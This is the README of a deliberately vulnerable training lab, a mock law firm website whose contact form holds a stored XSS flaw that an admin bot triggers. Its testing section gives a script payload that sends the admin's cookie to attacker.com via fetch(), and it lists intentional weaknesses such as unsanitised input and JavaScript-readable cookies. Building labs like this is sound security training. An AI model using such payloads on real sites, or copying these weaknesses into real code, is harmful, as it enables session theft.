# Law Firm XSS Stored Vulnerability Lab

## Description

This lab simulates a professional law firm website with a deliberately embedded **stored XSS vulnerability** in the contact form. The application demonstrates how attackers can exploit stored XSS vulnerabilities to steal session cookies and gain unauthorized access to administrative functions.

## Scenario

The application represents "Martin & Associés", a professional law firm website featuring:
- A public-facing website with contact form
- An administrative dashboard for managing client messages
- An automated admin bot that reviews messages every 30 seconds
- Internal data containing sensitive company information

## Vulnerability Details

### Stored XSS in Contact Form
- The contact form accepts user input without proper sanitization
- Submitted messages are stored in the database and displayed to administrators
- JavaScript code in messages executes when viewed by the admin bot
- This allows attackers to steal admin session cookies

### Attack Chain
1. **Payload Injection**: Attacker submits malicious JavaScript through contact form
2. **Storage**: Malicious payload is stored in the database
3. **Bot Trigger**: Admin bot automatically visits dashboard every 30 seconds
4. **Execution**: JavaScript executes in admin context, stealing session cookie
5. **Access**: Attacker uses stolen cookie to access internal data
6. **Flag Retrieval**: Attacker obtains the final flag from restricted area

## Quick Start

### Using Docker Compose (Recommended)

```bash
# Clone and navigate to the project
cd law-firm-xss-lab

# Start the application
docker-compose up -d

# Access the application
open http://localhost:3206
```

### Manual Setup

```bash
# Install dependencies
npm install

# Start the application
npm start

# In another terminal, start the admin bot
npm run bot
```

## Access Information

- **Application URL**: http://localhost:3206
- **Admin Dashboard**: http://localhost:3206/admin

## Testing the Vulnerability

### 1. Basic XSS Test
Submit this payload through the contact form:
```html
<script>alert('XSS Test')</script>
```

### 2. Cookie Theft Payload
Submit this payload to steal admin cookies:
```html
<script>
fetch('http://attacker.com/steal?cookie=' + encodeURIComponent(document.cookie));
</script>
```

### 3. Automated Testing
Run the included test suite:
```bash
python tests/test_xss_exploit.py
```

## File Structure

```
law-firm-xss-lab/
├── server.js              # Main Express server
├── bot.js                 # Admin bot simulation
├── package.json           # Node.js dependencies
├── docker-compose.yml     # Docker configuration
├── Dockerfile            # Container definition
├── public/               # Static files
│   ├── index.html        # Homepage
│   ├── contact.html      # Contact form
│   ├── admin-login.html  # Admin login
│   └── admin-dashboard.html # Admin dashboard
├── tests/                # Test files
│   └── test_xss_exploit.py
└── README.md             # This file
```

## Technical Details

### Technology Stack
- **Backend**: Node.js with Express
- **Database**: SQLite (in-memory)
- **Frontend**: HTML, CSS, JavaScript with TailwindCSS
- **Bot**: Puppeteer for automated browser simulation
- **Testing**: Python with requests library

### Security Features (Deliberately Vulnerable)
- No input sanitization on contact form
- Cookies accessible via JavaScript (httpOnly: false)
- Stored XSS vulnerability in message display
- Admin bot executes all JavaScript in messages

## Educational Objectives

This lab teaches:
- How stored XSS vulnerabilities work
- The impact of XSS on session management
- Cookie theft and session hijacking
- The importance of input validation and sanitization
- Real-world attack scenarios in business applications

## Troubleshooting

### Common Issues

1. **Port already in use**: Change port in `docker-compose.yml` or `server.js`
2. **Bot not starting**: Ensure Puppeteer dependencies are installed
3. **Tests failing**: Wait for application to fully start (10-15 seconds)

### Logs
```bash
# View application logs
docker-compose logs law-firm-app

# View bot logs
docker-compose logs admin-bot
```

## Contributing

This is an educational lab designed for security training. Please report any issues or suggestions for improvement.

## Disclaimer

**This is a deliberately vulnerable lab designed solely for educational purposes. Do not deploy this application in production environments or use it for malicious purposes.**

## License

MIT License - See LICENSE file for details. 